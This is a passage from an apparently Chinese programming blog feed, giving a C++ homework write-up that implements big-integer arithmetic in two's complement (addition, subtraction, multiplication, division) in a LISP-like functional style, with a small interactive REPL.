x)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">return</span> n;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (n == EmptyIntList) &#123;</div><div class="line">    <span class="keyword">return</span> EmptyIntList;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">auto</span> neW&#123;n-&gt;head() + x&#125;;</div><div class="line">    <span class="keyword">auto</span> new_last_digit&#123;calc_remain(neW)&#125;;</div><div class="line">    <span class="keyword">auto</span> new_carry&#123;calc_carry(neW)&#125;;</div><div class="line">    <span class="keyword">return</span> Cons(new_last_digit, carry(n-&gt;tail(), new_carry));</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="取负"><a href="#取负" class="headerlink" title="取负"></a>取负</h3><p>这个大家都应该很熟悉了，取负的操作 —— 取反加一！<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">negate</span><span class="params">(IntList n)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> carry(invert(n), <span class="number">1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h1 id="补码构造"><a href="#补码构造" class="headerlink" title="补码构造"></a>补码构造</h1><p>实现了各种位操作，终于可以用来构造补码了。<br>用户输入的正数形式为<code>123, 456, 789</code>，存储成<code>list</code>即为<code>(123, 456, 789)</code>，正好与补码形式相反，因此只需补充符号位，再翻转<code>list</code>即可。<br>负数形式为<code>-123, 456, 789</code>，存储成<code>list</code>即为<code>(-123, 456, 789)</code>，这里将第一位变成正数，借用构造正数的过程，最后再取负。<br>实现如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">make_number</span><span class="params">(IntList lst)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">if</span> (Any([](<span class="keyword">int</span> x) -&gt; <span class="keyword">bool</span> &#123; <span class="keyword">return</span> x &lt; <span class="number">0</span>; &#125;, lst-&gt;tail())) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">"###### 操作数输入错误：符号错误。"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (Any([=](<span class="keyword">int</span> x) -&gt; <span class="keyword">bool</span> &#123; <span class="keyword">return</span> <span class="built_in">abs</span>(x) &gt;= base; &#125;, lst)) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">"###### 操作数输入错误：每单元最多包含3位数。"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">return</span> (lst-&gt;head() &gt;= <span class="number">0</span>) ?</div><div class="line">      Reverse(Cons(<span class="number">0</span>, lst)) :</div><div class="line">      negate(make_number(Cons(- lst-&gt;head(), lst-&gt;tail())));</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h1 id="加减乘除"><a href="#加减乘除" class="headerlink" title="加减乘除"></a>加减乘除</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">add</span><span class="params">(IntList, IntList)</span></span>;</div><div class="line"><span class="function">IntList <span class="title">sub</span><span class="params">(IntList, IntList)</span></span>;</div><div class="line"><span class="function">IntList <span class="title">mul</span><span class="params">(IntList, IntList)</span></span>;</div><div class="line"><span class="function">IntList <span class="title">div</span><span class="params">(IntList, IntList)</span></span>;</div></pre></td></tr></table></figure>
<p>该来的还是来了。</p>
<h2 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h2><p>补码加法就是可以为所欲为，只需要位数相同，无视正负数直接加。当位数不同时，提升位数后再加。学过全加器的读者应该能看出<code>add(carry(x-&gt;tail(), new_carry)</code>是多么亲切。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">add</span><span class="params">(IntList x, IntList y)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">auto</span> x_len&#123;Length(x)&#125;;</div><div class="line">  <span class="keyword">auto</span> y_len&#123;Length(y)&#125;;</div><div class="line">  <span class="keyword">if</span> (x_len != y_len) &#123;</div><div class="line">    <span class="keyword">auto</span> higher_digits_length = x_len &gt; y_len ? x_len : y_len;</div><div class="line">    <span class="keyword">return</span> add(raise_digits(x, higher_digits_length),</div><div class="line">               raise_digits(y, higher_digits_length));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (x == EmptyIntList &amp;&amp; y == EmptyIntList) &#123;</div><div class="line">    <span class="keyword">return</span> EmptyIntList;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">auto</span> neW&#123;x-&gt;head() + y-&gt;head()&#125;;</div><div class="line">    <span class="keyword">auto</span> new_last_digit&#123;calc_remain(neW)&#125;;</div><div class="line">    <span class="keyword">auto</span> new_carry&#123;calc_carry(neW)&#125;;</div><div class="line">    <span class="keyword">return</span> Cons(new_last_digit, add(carry(x-&gt;tail(), new_carry), y-&gt;tail()));</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h2><p>传说中的开挂来了，不多说。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">sub</span><span class="params">(IntList x, IntList y)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> add(x, negate(y));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h2><p>先实现一位乘以多位，接着实现多位乘以多位。计算过程和手动乘法差不多，注意到一位乘以多位可以直接用<code>Map</code>，多位乘以多位用到了<code>Fold</code>配合左移。<br>有读者可能会问，这不是补码吗，为什么这里感觉像是直接原码乘。是的，这里实际上采用的是补码一位乘的校正法，是我从华工编写的《计算机组成原理与汇编语言》里面找来的。最后还需要看情况补上一个余项。至于这个余项怎么算出来，读者可以自己翻书（笔者数学不好实在是搞不懂）。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">mul</span><span class="params">(IntList x, IntList y)</span></span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">  <span class="keyword">auto</span> mul_digit_by_all_digits = [](<span class="keyword">int</span> x, IntList xs) &#123;</div><div class="line">      <span class="keyword">return</span> PoorMap([=](<span class="keyword">int</span> y) &#123; <span class="keyword">return</span> y * x; &#125;, xs);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">  <span class="keyword">auto</span> mul_digits_by_all_digits = [&amp;mul_digit_by_all_digits](IntList y, IntList x) &#123;</div><div class="line">      <span class="keyword">return</span> FoldRight([=, &amp;mul_digit_by_all_digits](<span class="keyword">int</span> term, IntList xs) &#123;</div><div class="line">          <span class="keyword">return</span> add(mul_digit_by_all_digits(term, y),</div><div class="line">                     shift_left(xs, <span class="number">1</span>));</div><div class="line">      &#125;, make_number(toList(&#123;<span class="number">0</span>&#125;)), x);</div><div class="line">    &#125;;</div><div class="line">  </div><div class="line">  <span class="keyword">auto</span> new_digits_length&#123;Length(x) + Length(y) - <span class="number">1</span>&#125;;</div><div class="line">  <span class="keyword">auto</span> pre_mul = [=](IntList x, IntList y) &#123; </div><div class="line">      <span class="keyword">return</span> mul_digits_by_all_digits( raise_digits(x, new_digits_length), y);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">  <span class="keyword">auto</span> remain_term = [=](IntList t1, IntList t2) &#123;</div><div class="line">      <span class="keyword">return</span> !(is_negative(t2)) ?</div><div class="line">        make_number(toList(&#123;<span class="number">0</span>&#125;)) :</div><div class="line">        negate( shift_left( raise_digits(t1, new_digits_length),</div><div class="line">                            Length(t2)));</div><div class="line">    &#125;;</div><div class="line">  <span class="comment">// 传说中神奇的余项</span></div><div class="line"></div><div class="line">  <span class="keyword">return</span> add(pre_mul(x, y), remain_term(x, y));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h2><p>到了除法，我已经越来越懒于找更精妙的算法了。全部转成正数，直接仿照人工手动除法，最后再调整符号。<br><code>quo_prime</code>和<code>rem_prime</code>两个函数用于最初级的除法形式：被除数减除数，重复减直至负数，减的次数即为商。<br>当然不可能真的这样来计算商，我们可以先通过<code>calc_digits</code>计算商的位数，然后模仿人工除法，把除数左移，然后再利用<code>quo_prime</code>和<code>rem_prime</code>一位一位算。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">div</span><span class="params">(IntList x, IntList y)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">if</span> (Length(Filter([](<span class="keyword">int</span> x) &#123; <span class="keyword">return</span> x != <span class="number">0</span>; &#125;, y)) == <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">"###### 除零错误。"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="built_in">std</span>::function&lt;<span class="keyword">int</span>(IntList, IntList)&gt; quo_prime = </div><div class="line">  [&amp;quo_prime](IntList t1, IntList t2) &#123;</div><div class="line">    <span class="keyword">auto</span> remain&#123;sub(t1, t2)&#125;;</div><div class="line">    <span class="keyword">return</span> is_negative(remain) ? </div><div class="line">      <span class="number">0</span> : (<span class="number">1</span> + quo_prime(remain, t2));</div><div class="line">  &#125;;</div><div class="line">  <span class="built_in">std</span>::function&lt;IntList(IntList, IntList)&gt; rem_prime = </div><div class="line">  [&amp;rem_prime](IntList t1, IntList t2) &#123;</div><div class="line">    <span class="keyword">auto</span> remain&#123;sub(t1, t2)&#125;;</div><div class="line">    <span class="keyword">return</span> is_negative(remain) ?</div><div class="line">      add(remain, t2) : rem_prime(remain, t2);</div><div class="line">  &#125;;</div><div class="line"></div><div class="line"></div><div class="line">  <span class="built_in">std</span>::function&lt;<span class="keyword">int</span>(IntList, IntList)&gt; calc_digits = </div><div class="line">  [&amp;calc_digits](IntList t1, IntList t2) &#123;</div><div class="line">    <span class="keyword">return</span> is_negative(sub(t1, t2))?</div><div class="line">      <span class="number">0</span> : (<span class="number">1</span> + calc_digits(t1, shift_left(t2, <span class="number">1</span>)));</div><div class="line">  &#125;;</div><div class="line"></div><div class="line">  <span class="keyword">auto</span> div_posi = [&amp;calc_digits, &amp;quo_prime, &amp;rem_prime](IntList t1, IntList t2) &#123;</div><div class="line">    <span class="keyword">auto</span> raised_t2 = raise_digits(t2, Length(t1));</div><div class="line">    <span class="keyword">auto</span> digits_length = calc_digits(t1, raised_t2);</div><div class="line"></div><div class="line">    <span class="keyword">auto</span> result = make_number(toList(&#123;<span class="number">0</span>&#125;));</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">auto</span> dividend = t1</div><div class="line">        , divisor = shift_left(raised_t2, digits_length - <span class="number">1</span>)</div><div class="line">        ; digits_length != <span class="number">0</span></div><div class="line">        ; digits_length--)</div><div class="line">        &#123;</div><div class="line">          result = Cons(quo_prime(dividend, divisor), result);</div><div class="line">          dividend = rem_prime(dividend, divisor);</div><div class="line">          divisor = shift_right(divisor, <span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">  &#125;;</div><div class="line"></div><div class="line"></div><div class="line">  <span class="keyword">if</span> (is_negative(x) &amp;&amp; is_negative(y)) &#123;</div><div class="line">    <span class="keyword">return</span> div_posi(negate(x), negate(y));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (is_negative(x)) &#123;</div><div class="line">    <span class="keyword">return</span> negate(div_posi(negate(x), y));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (is_negative(y)) &#123;</div><div class="line">    <span class="keyword">return</span> negate(div_posi(x, negate(y)));</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">return</span> div_posi(x, y);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>到这里，所有核心代码已经交代完毕，剩余的就是些交互代码了。交互代码可以放松对函数式的执着，毕竟全是在跟副作用打交道！</p>
<hr>
<h1 id="交互代码"><a href="#交互代码" class="headerlink" title="交互代码"></a>交互代码</h1><p>最后再来实现一个REPL（Read–Eval–Print Loop）。</p>
<h2 id="读取（Read）"><a href="#读取（Read）" class="headerlink" title="读取（Read）"></a>读取（Read）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">Parser</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> delimiter&#123;<span class="string">","</span>&#125;;</div><div class="line"></div><div class="line">  IntList result&#123;EmptyIntList&#125;;</div><div class="line"></div><div class="line">  <span class="keyword">size_t</span> pos&#123;<span class="number">0</span>&#125;;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> token;</div><div class="line">  <span class="keyword">while</span> ((pos = s.find(delimiter)) != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</div><div class="line">      token = s.substr(<span class="number">0</span>, pos);</div><div class="line">      result = Cons(stoi(token), result);</div><div class="line">      s.erase(<span class="number">0</span>, pos + delimiter.length());</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="keyword">return</span> Reverse(Cons(stoi(s), result));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="求值（Eval）"><a href="#求值（Eval）" class="headerlink" title="求值（Eval）"></a>求值（Eval）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">Eval</span><span class="params">(<span class="keyword">char</span> op, IntList x, IntList y)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">switch</span> (op) &#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">'+'</span>: <span class="keyword">return</span> add(x, y); <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'-'</span>: <span class="keyword">return</span> sub(x, y); <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'*'</span>: <span class="keyword">return</span> mul(x, y); <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'/'</span>: <span class="keyword">return</span> div(x, y); <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> EmptyIntList; <span class="keyword">break</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="打印（Print）"><a href="#打印（Print）" class="headerlink" title="打印（Print）"></a>打印（Print）</h2><p>打印函数是整个程序中第二长的函数，可见为了用户体验，程序员付出了多少汗水。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrettyPrint</span><span class="params">(<span class="keyword">char</span> op, IntList left, IntList right, IntList result)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">auto</span> format_num = [](IntList n) -&gt; IntList &#123;</div><div class="line">    <span class="keyword">auto</span> remove_zero = [](IntList n) -&gt; IntList &#123;</div><div class="line">      <span class="keyword">auto</span> a = n;</div><div class="line">      <span class="keyword">for</span> (</div><div class="line">          ; (a-&gt;head() == <span class="number">0</span>) &amp;&amp; (a-&gt;tail() != EmptyIntList)</div><div class="line">          ; a = a-&gt;tail()</div><div class="line">      ) &#123;&#125;</div><div class="line">      <span class="keyword">return</span> a;</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">if</span> (is_negative(n)) &#123;</div><div class="line">      <span class="keyword">auto</span> posi = remove_zero(Reverse(negate(n)));</div><div class="line">      <span class="keyword">return</span> Cons(- posi-&gt;head(), posi-&gt;tail());</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">      <span class="keyword">return</span> remove_zero(Reverse(n));</div><div class="line">    &#125;</div><div class="line">  &#125;;</div><div class="line">  <span class="keyword">auto</span> l = format_num(left);</div><div class="line">  <span class="keyword">auto</span> r = format_num(right);</div><div class="line">  <span class="keyword">auto</span> res = format_num(result);</div><div class="line">  <span class="keyword">auto</span> len = <span class="built_in">std</span>::max(&#123;Length(l), Length(r), Length(res)&#125;);</div><div class="line"></div><div class="line">  <span class="keyword">auto</span> print_num = [](IntList n, <span class="keyword">size_t</span> len) -&gt; <span class="keyword">void</span> &#123;</div><div class="line">    <span class="keyword">auto</span> print_digit = [](<span class="keyword">int</span> n, <span class="keyword">size_t</span> width) -&gt; <span class="keyword">void</span> &#123;</div><div class="line">      <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::setfill(<span class="string">'0'</span>) &lt;&lt; <span class="built_in">std</span>::setw(width) &lt;&lt; n;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::setfill(<span class="string">' '</span>) &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">4</span> * (len - Length(n)) + <span class="number">1</span>) &lt;&lt; <span class="string">' '</span>;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::setfill(<span class="string">' '</span>) &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">4</span>) &lt;&lt; n-&gt;head();</div><div class="line">    <span class="keyword">while</span> (n-&gt;tail() != EmptyIntList) &#123;</div><div class="line">      <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">" "</span>;</div><div class="line">      n = n-&gt;tail();</div><div class="line">      print_digit(n-&gt;head(), <span class="number">3</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;;</div><div class="line"></div><div class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span> &lt;&lt; <span class="string">" "</span>;  </div><div class="line">  print_num(l, len);</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span> &lt;&lt; op;</div><div class="line">  print_num(r, len);</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span> &lt;&lt; <span class="built_in">std</span>::setfill(<span class="string">'-'</span>) &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">4</span> * (len + <span class="number">1</span>)) &lt;&lt; <span class="string">' '</span>;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span> &lt;&lt; <span class="string">" "</span>;</div><div class="line">  print_num(res, len);</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="ONE-LOOP"><a href="#ONE-LOOP" class="headerlink" title="ONE LOOP"></a>ONE LOOP</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Engine</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"\n\n请输入运算符(+ - * /)："</span>;</div><div class="line">  <span class="keyword">char</span> op;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; op;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> junk;</div><div class="line">  <span class="built_in">std</span>::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, junk, <span class="string">'\n'</span>);</div><div class="line">  <span class="keyword">if</span> (op != <span class="string">'+'</span> &amp;&amp; op != <span class="string">'-'</span> &amp;&amp; op != <span class="string">'*'</span> &amp;&amp; op != <span class="string">'/'</span> ) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">"###### 操作符解析错误：应为 + 或 - 或 * 或 /。"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入第一个操作数 (示例：-123, 456, 789 )："</span>;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> s1&#123;<span class="string">""</span>&#125;;</div><div class="line">  <span class="built_in">std</span>::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, s1, <span class="string">'\n'</span>);</div><div class="line">  <span class="keyword">auto</span> n1 = make_number(Parser(s1));</div><div class="line"></div><div class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入第二个操作数 (示例：-123, 456, 789 )："</span>;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> s2&#123;<span class="string">""</span>&#125;;</div><div class="line">  <span class="built_in">std</span>::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, s2, <span class="string">'\n'</span>);  </div><div class="line">  <span class="keyword">auto</span> n2 = make_number(Parser(s2));</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (Length(n1) &lt;= <span class="number">0</span> || Length(n2) &lt;= <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">"###### 操作数解析错误，格式应为：-123, 456, 789"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">auto</span> res = Eval(op, n1, n2);</div><div class="line">  PrettyPrint(op, n1, n2, res);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="REPL-以及错误处理"><a href="#REPL-以及错误处理" class="headerlink" title="REPL 以及错误处理"></a>REPL 以及错误处理</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      Engine();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (<span class="built_in">std</span>::runtime_error err) &#123;</div><div class="line">      <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"\n"</span> &lt;&lt; err.what() &lt;&lt; <span class="string">"\n"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"\n\n继续输入？请键入 y 或 n 进行确认："</span>;</div><div class="line">    <span class="keyword">char</span> c;</div><div class="line">    <span class="keyword">if</span> (!(<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; c) || c == <span class="string">'n'</span>) <span class="keyword">break</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<p>作业一到此为止，作业二更有意思，让我们拭目以待。<br>完整代码：<a href="https://github.com/zhongzc/C-/blob/master/longnum.cpp" target="_blank" rel="external">https://github.com/zhongzc/C-/blob/master/longnum.cpp</a></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;既已有基础材料，撸起袖子做作业。&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C++" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/C/"/>
    
    
      <category term="编程" scheme="http://gaufoo.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C++" scheme="http://gaufoo.com/tags/C/"/>
    
      <category term="LISP" scheme="http://gaufoo.com/tags/LISP/"/>
    
      <category term="函数式编程" scheme="http://gaufoo.com/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>用C++写出伪LISP代码（一）</title>
    <link href="http://gaufoo.com/2018/03/03/cppnlisp1/"/>
    <id>http://gaufoo.com/2018/03/03/cppnlisp1/</id>
    <published>2018-03-03T08:48:23.000Z</published>
    <updated>2018-03-04T04:16:35.891Z</updated>
    
    <content type="html"><![CDATA[<p>LISP赐予我力量。</p>
<a id="more"></a>
<hr>
